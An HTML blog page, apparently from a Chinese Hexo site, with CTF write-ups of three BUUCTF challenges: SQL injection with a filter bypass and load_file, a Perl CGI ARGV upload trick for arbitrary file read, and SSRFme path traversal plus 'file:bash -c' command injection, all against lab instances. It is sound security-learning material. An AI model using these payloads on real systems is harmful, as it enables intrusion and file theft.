@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="[网鼎杯 2018]Fakebook	[CSAWQual 2016]i_got_id	[HITCON 2017]SSRFme">
+<meta property="og:type" content="website">
+<meta property="og:title" content="buuctf的部分解题">
+<meta property="og:url" content="http://example.com/exp/question%20twenty-one.html">
+<meta property="og:site_name" content="Once">
+<meta property="og:description" content="[网鼎杯 2018]Fakebook	[CSAWQual 2016]i_got_id	[HITCON 2017]SSRFme">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-09-16T12:16:33.288Z">
+<meta property="article:modified_time" content="2023-02-03T07:11:53.649Z">
+<meta property="article:author" content="Once">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/exp/question%20twenty-one">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>buuctf的部分解题 | Once
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Once</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">26</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">buuctf的部分解题
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <p>[网鼎杯 2018]Fakebook	[CSAWQual 2016]i_got_id	[HITCON 2017]SSRFme</p>
+<span id="more"></span>
+
+<h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>1.打开显示</p>
+
+
+<p>点击join，可以注册，先注册一个，登录后看到</p>
+
+
+<p>admin可以点击，点击后看到有一个传参，应该存在注入</p>
+
+
+<p>2.使用?no &#x3D; 1 and 1&#x3D;1，回显正常</p>
+<p>?no &#x3D; 1 and 1&#x3D;2，错误回显，说明是数字型注入</p>
+<p>3.使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?no=1 order by 4    回显正常</span><br><span class="line">?no=1 order by 5    回显错误</span><br></pre></td></tr></table></figure>
+
+<p>所以应该有4个字段</p>
+<p>4.使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4--+</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+
+
+<p>其实是union select被过滤了，可以使用union&#x2F;**&#x2F;select，回显</p>
+
+
+<p>看到在username处有一个回显</p>
+<p>5.load_file()函数可以利用绝对路径去加载一个文件</p>
+<p>看wp说根据</p>
+
+
+<p>而且扫目录扫到flag.php文件，并且flag.php也在这个目录中</p>
+<p>所以可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4--+</span><br></pre></td></tr></table></figure>
+
+<p>最后打开网页源代码看到flag</p>
+<h3 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h3><p>1.打开显示</p>
+
+
+<p>都点击一遍</p>
+<p><code>Hello World</code>显示</p>
+
+
+<p><code>Forms</code>显示</p>
+
+
+<p><code>Files</code>显示</p>
+
+
+<p>2.<code>perl</code>是一种计算机语言，再<code>Forms</code>里并没有什么注入，在上传文件这里，随便上传一个<code>txt</code>文件，内容是<code>123</code>，上传显示</p>
+
+
+<p>会将文本返回</p>
+<p>3.wp是猜测了源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line">use CGI;</span><br><span class="line"></span><br><span class="line">my $cgi= CGI-&gt;new;</span><br><span class="line">if ( $cgi-&gt;upload( &#x27;file&#x27; ) )</span><br><span class="line">&#123;</span><br><span class="line">my $file= $cgi-&gt;param( &#x27;file&#x27; );</span><br><span class="line">while ( &lt;$file&gt; ) &#123; print &quot;$_&quot;; &#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中的<code>param()</code>函数会返回一个列表的文件但是只有第一个文件会被放入到下面的<code>file</code>变量中，然后如果传入一个<code>ARGV</code>的文件，就会将<code>ARGV</code>当作文件名读出来，然后就可以读取任意文件</p>
+<p>4.使用burp，随便上传一个文件的时候抓包</p>
+
+
+<p>将15到16行的内容复制一下，把filename去掉,加上<code>ARGV</code></p>
+
+
+<p>在url处读取文件，<code>+</code>号代替空格</p>
+
+
+<p>发包得到flag</p>
+
+
+<h3 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h3><p>1.打开显示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">106.9</span>.<span class="number">162.98</span> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>2.分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">106.9.162.98 &lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line"></span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br></pre></td></tr></table></figure>
+
+<p>这里就是创造一个&#x2F;sandbox&#x2F;2eeed2f9aeae6311b507ada8fb98809e&#x2F;路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">$info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">$dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">@mkdir($dir);</span><br><span class="line">@chdir($dir);</span><br><span class="line">@file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>这里看到可以使用get传参url和filename，pathinfo()函数就是将传入的进行数组化，basename()函数是返回路径中的文件名，最后file_put_contents(basename($info[“basename”]), $data);是将文件名导入路径中</p>
+<p>3.先使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=./../../&amp;filename=123</span><br></pre></td></tr></table></figure>
+
+<p>这个是将.&#x2F;..&#x2F;..&#x2F;路径下的东西存入123，然后访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://936abc99-09df-47fa-99c9-320d068f4f31.node4.buuoj.cn:81/sandbox/2eeed2f9aeae6311b507ada8fb98809e/123</span><br></pre></td></tr></table></figure>
+
+
+
+<p>点击都没有反应，再使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=./../../../../../&amp;filename=123</span><br></pre></td></tr></table></figure>
+
+<p>访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://936abc99-09df-47fa-99c9-320d068f4f31.node4.buuoj.cn:81/sandbox/2eeed2f9aeae6311b507ada8fb98809e/123</span><br></pre></td></tr></table></figure>
+
+
+
+<p>看到有flag和readflag文件，点击都没有用</p>
+<p>4.需要使用命令bash -c，目的是将命令执行获得的文件结果放到其他文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=file:bash -c /flag|&amp;filename=111</span><br></pre></td></tr></table></figure>
+
+<p>将flag文件存到111文件中，然后访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sandbox/2eeed2f9aeae6311b507ada8fb98809e/111</span><br></pre></td></tr></table></figure>
+
+<p>发现什么都没有回显</p>
+<p>5.那就是在readflag中，使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=file:bash -c /readflag|&amp;filename=111</span><br></pre></td></tr></table></figure>
+
+<p>然后访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sandbox/2eeed2f9aeae6311b507ada8fb98809e/111</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="nav-number">1.</span> <span class="nav-text">[网鼎杯 2018]Fakebook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSAWQual-2016-i-got-id"><span class="nav-number">2.</span> <span class="nav-text">[CSAWQual 2016]i_got_id</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HITCON-2017-SSRFme"><span class="nav-number">3.</span> <span class="nav-text">[HITCON 2017]SSRFme</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Once"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">Once</p>
+  <div class="site-description" itemprop="description">forever</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1410039666&auto=0&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer">
+   <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1410039666&auto=0&height=66">
+   </iframe>
+  </div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">world</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'PZfVYAl8hrPpczg4EF7C05Rh-gzGzoHsz',
+      appKey     : 'cx8a6nD3cI8V4erQeXcAarYz',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
